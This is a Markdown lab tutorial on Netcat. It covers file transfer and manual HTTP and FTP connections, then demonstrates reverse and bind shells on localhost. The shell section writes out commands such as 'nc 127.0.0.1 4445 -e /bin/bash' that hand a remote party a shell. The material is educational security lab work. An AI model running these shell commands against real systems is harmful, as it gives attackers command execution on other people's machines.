# Netcat

As the Swiss Army Knife of networking, it has so many features and so many uses.

Fundamentally, it operates as either a sender or a receiver of arbitrary data across the network.

## Activity 1

1. Firstly, to confirm the IP address you will need to use in this case.

2. `nc -lp`

Netcat is now listening for data to come in on port 4545.

![image](https://user-images.githubusercontent.com/118358126/202835564-dde03d22-5c10-44e5-8a98-052997426a08.png)

3. on your own windows system which also has the Netcat version nc64 installed. build the raw data connection to the VM. try to type Hello Universe here.

![image](https://user-images.githubusercontent.com/118358126/202835588-b8fdbd75-3180-4f35-98c8-2034bcb8dffc.png)

and the VM will also sync the ‘Hello Universe’.

![image](https://user-images.githubusercontent.com/118358126/202835599-0b6be66c-024f-443f-97d6-4adafe520438.png)

vice versa

4. To terminate the connection, you can use ‘Ctrl + c’

![image](https://user-images.githubusercontent.com/118358126/202835636-94907f5e-cebf-4fca-b0f0-22d21fabecaa.png)

5. to view a document, use `cat`

![image](https://user-images.githubusercontent.com/118358126/202835662-02682ed3-6b32-4916-8c12-a86ced7d98a9.png)

![image](https://user-images.githubusercontent.com/118358126/202835666-b7bb8fb5-9928-4106-a363-ed4dd2ebe174.png)

6.	if you want to receive this file on windows, firstly, I will check my IP address with `ipconfig`.

![image](https://user-images.githubusercontent.com/118358126/202835680-08b75d9a-66b1-4608-9d1f-c8493c589f4c.png)

the Ip address is 10.0.2.14

7. I will now set up Netcat to listen and receive our Kali file.  Whatever coming in I will put it into incoming.txt

![image](https://user-images.githubusercontent.com/118358126/202836065-6852277c-4608-4780-9f5f-f9e8caa4d48d.png)

8. to transfer the file, we use below command `-w3` means it will terminate if with three seconds of no transfer.

![image](https://user-images.githubusercontent.com/118358126/202836061-d4755860-b9b9-4c80-ba47-79def05c6a61.png)


9. now we can check if we've received the document.

![image](https://user-images.githubusercontent.com/118358126/202835949-5e887b3a-e293-4a5c-a659-fbb4e2630a06.png)

![image](https://user-images.githubusercontent.com/118358126/202835954-4c300e78-d5d1-43c5-b3fc-fb3d48ac5a8f.png)

we can see that we've got the same file that we sent.

10. Netcat can also be used as a client for services on another host.

For example, we can use Netcat to connect to a web server. I will typen `nc -v` on port 80. `-v` means Netcat to be verbose, 80 is the standard port for accessing a website.

![image](https://user-images.githubusercontent.com/118358126/202836230-f8b0a665-8a45-42f7-9de2-594969690f19.png)

When the connection is made, I can type the HTTP command:`GET index.html HTTP/1.1`, and the web server will deliver its webpage code.

![image](https://user-images.githubusercontent.com/118358126/202836262-8b5f9d4f-c4e3-4670-9d03-c9285eb19e7b.png)

11. I can connect to an FTP server, I will type `nc -v` to connect to my Metasploit FTP service.

![image](https://user-images.githubusercontent.com/118358126/202836331-2bdd394a-374f-4c69-a62f-a968671a45f0.png)

Firstly, I will type `user anonymous`

![image](https://user-images.githubusercontent.com/118358126/202836364-622266c5-25ea-4402-81d0-5fd360c6746d.png)

Then I will type pass to a whatever email address, which is a random string for the password for anonymous.

![image](https://user-images.githubusercontent.com/118358126/202836434-941d90f8-1980-4c1a-ac65-fe7497150246.png)

12. type `help` to get a list of the FTP commands available on that server.

![image](https://user-images.githubusercontent.com/118358126/202836480-17110108-e8ae-4b5c-8c0f-368ce630f778.png)

13. lastly, type `quit` to quit.

![image](https://user-images.githubusercontent.com/118358126/202836515-37d7ce55-360c-4c8a-b389-9194872df516.png)

----------------

## Activity 2

We will use a networking command-line tool called **Netcat** to demonstrate bind and reverse shells. 
  - Netcat is primarily used to view traffic across a network. 
  - Netcat is often referred to as the "Swiss army knife" of networking tools, because it can assist with many security and admin activities.

Note that this demonstration will not show an exploit, but will show how certain exploits utilize shells to provide the attacker terminal access on a target.

1. In Kali, open a terminal and type `nc -h` to show the Help menu for Netcat.
    - The old version of Netcat was accessed by typing `ncat`. We use `nc` to access the new version, which has additional functionality.

**Reverse Shells**

2. First, you'll demonstrate a reverse shell. Use Netcat to listen on port 4445 by typing `nc -lvp 4445`, as the following image shows:

![image](https://user-images.githubusercontent.com/118358126/203070535-ee6d3073-b500-4fc9-b7b9-a701705a59eb.png)

   - This will act as the attacker's host, which is now listening for a connection from a remote machine.
   - The flags used are: `l` (listen), `v` (verbose), `p` (port).
 
3. Open another terminal window (not tab) and position it next to the current terminal window where `nc` is listening, as the following image shows: 

![image](https://user-images.githubusercontent.com/118358126/203071151-43c66f77-980b-42e2-9659-ccc980c1f67e.png)

    This new window will act as the victim/target machine.

4. In the new window, connect to port 4445 on the attacker's host window by typing `nc 127.0.0.1 4445 -e /bin/bash`, as the following image shows:

![image](https://user-images.githubusercontent.com/118358126/203070920-e8f7d4d6-034f-4d4f-a4f3-5288fe018b4d.png)
	
5. From the attacker's window, we now have a reverse shell opened on the target host, and we can now execute commands to it remotely. 

6. Run `whoami` in the attacker's window.

    - This type of attack requires the host to run the connection string command (`nc 127.0.0.1 4445 -e /bin/bash`), which is often done through some type of **remote-code execution (RCE)** exploit.

    - Use ctrl+C to stop the Netcat connection, and `clear` the windows.

**Bind Shells**


1. In the victim/target's window on the right, run `nc -lvp 4445 -e /bin/bash`.

    - The victim now has /bin/bash listening on port 4445, as the following image shows:

![image](https://user-images.githubusercontent.com/118358126/203071536-2db1f861-248a-4b7c-917d-7b48508228af.png)
	
2. In the attacker window on the left, connect to port 4445: `nc 127.0.0.1 4445`. Run the `id` command to show you have a shell and can execute commands, as the following image shows: 

![image](https://user-images.githubusercontent.com/118358126/203071691-bb716532-0a61-42ea-9d4d-fe9d832e2ae9.png)

 - A bind shell requires the listener to be set up on the victim/target, where a reverse shell has the listener on the attacker's machine.


